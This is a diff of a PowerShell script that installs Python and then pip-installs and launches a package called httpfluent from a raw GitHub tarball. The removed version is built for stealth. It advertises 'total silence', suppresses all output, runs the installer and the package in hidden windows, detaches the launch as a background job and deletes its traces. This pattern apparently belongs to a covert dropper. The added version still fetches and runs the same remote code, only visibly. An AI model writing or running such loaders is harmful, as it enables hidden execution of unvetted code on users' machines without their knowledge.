@@ -1,13 +1,14 @@
 # ===================================================
-# Python 3.12.6 + httpfluent (Ultimate Stealth Fix)
-# TOTAL SILENCE - ALL OUTPUT TO NULL
+# Python 3.12.6 + httpfluent (Full Debug / No Stealth)
 # ===================================================
 
 $InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
 $PythonExe = Join-Path $InstallDir "python.exe"
 $InstallRequired = $true
 
-# --- Pre-Check (Silent) ---
+Write-Host "--- CHECKING ENVIRONMENT ---" -ForegroundColor Cyan
+
+# 0. Check if Python is already here
 if (Get-Command python -ErrorAction SilentlyContinue) {
     $CheckPath = "python"
 } elseif (Test-Path $PythonExe) {
@@ -16,68 +17,63 @@ if (Get-Command python -ErrorAction SilentlyContinue) {
 
 if ($CheckPath) {
     $VersionString = & $CheckPath --version 2>&1
+    Write-Host "[DEBUG] Python check result: $VersionString"
     if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
-        if ([version]$Matches[1] -ge [version]"3.9") { 
-            $InstallRequired = $false 
+        $Ver = [version]$Matches[1]
+        if ($Ver -ge [version]"3.9") {
+            Write-Host "[+] Python $Ver found. Skipping Install." -ForegroundColor Green
+            $InstallRequired = $false
             $ExecutableToUse = $CheckPath
         }
     }
 }
 
-# --- YOUR ALGORITHM (Steps 1-5) ---
+# --- YOUR ALGORITHM (VISIBLE) ---
 if ($InstallRequired) {
+    Write-Host "--- DOWNLOADING PYTHON ---" -ForegroundColor Cyan
     $PythonVersion = "3.12.6"
-    $PythonInstaller = "python-$PythonVersion-amd64.exe"
-    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
+    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-amd64.exe"
     $DownloadDir = "$env:TEMP\Python"
-
-    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1 }
-    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
+    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir }
+    $InstallerPath = Join-Path $DownloadDir "python-installer.exe"
     
-    try {
-        (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
-    } catch { exit 1 }
+    Write-Host "[*] Downloading from: $DownloadUrl"
+    Invoke-WebRequest -Uri $DownloadUrl -OutFile $InstallerPath -UseBasicParsing
+    Write-Host "[+] Download finished."
 
-    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1
+    Write-Host "--- INSTALLING PYTHON ---" -ForegroundColor Cyan
+    Write-Host "[*] Starting installer window... (Check taskbar if it doesn't appear)"
+    # Removed /quiet so you can see the installer if it fails
+    $p = Start-Process -FilePath $InstallerPath -ArgumentList "/passive InstallAllUsers=0 PrependPath=1 TargetDir=`"$InstallDir`"" -Wait -PassThru
+    Write-Host "[DEBUG] Installer finished with Exit Code: $($p.ExitCode)"
 
+    Write-Host "--- REFRESHING PATH ---" -ForegroundColor Cyan
     $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
     $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
-    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
-    
+    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User")
     $env:Path = $NewPath
     $ExecutableToUse = $PythonExe
 }
 
-# --- Step 7: Package Installation ---
-& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
-& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
-& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1
+Write-Host "--- INSTALLING PACKAGES ---" -ForegroundColor Cyan
+Write-Host "[*] Updating Pip..."
+& $ExecutableToUse -m pip install --upgrade pip
 
-# --- THE MASTER FIX: TRIPLE-METHOD BACKGROUND LAUNCH ---
-# This block attempts to launch the process and keep it alive after the script dies.
+Write-Host "[*] Installing Requests..."
+& $ExecutableToUse -m pip install requests
 
-$ScriptBlock = {
-    $TargetDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
-    $TargetExe = Join-Path $TargetDir "python.exe"
-    $TargetBin = Join-Path $TargetDir "Scripts\httpfluent.exe"
+Write-Host "[*] Installing httpfluent..."
+& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz"
 
-    # Method A: Direct EXE
-    if (Test-Path $TargetBin) { Start-Process $TargetBin -WindowStyle Hidden > $null 2>&1 }
-    
-    # Method B: PowerShell Command
-    Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command httpfluent" -WindowStyle Hidden > $null 2>&1
-    
-    # Method C: Module Mode
-    Start-Process $TargetExe -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
-}
+Write-Host "--- LAUNCHING httpfluent ---" -ForegroundColor Cyan
+Write-Host "[*] Attempting direct command launch: httpfluent"
 
-# Start the launch block as a background job so it detaches from this script
-Start-Job -ScriptBlock $ScriptBlock > $null 2>&1
+# This uses -NoExit so the window stays open for you to read
+Start-Process powershell -ArgumentList "-NoExit -Command httpfluent"
 
-# Brief wait to ensure jobs are triggered
-Start-Sleep -Seconds 5
-
-# --- Step 8: Cleanup ---
+Write-Host "--- CLEANUP ---" -ForegroundColor Cyan
 if (Test-Path "$env:TEMP\Python") {
-    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
+    Remove-Item "$env:TEMP\Python" -Recurse -Force
 }
+
+Write-Host "[FINISHED] If the second window shows an error, copy it here." -ForegroundColor Cyan
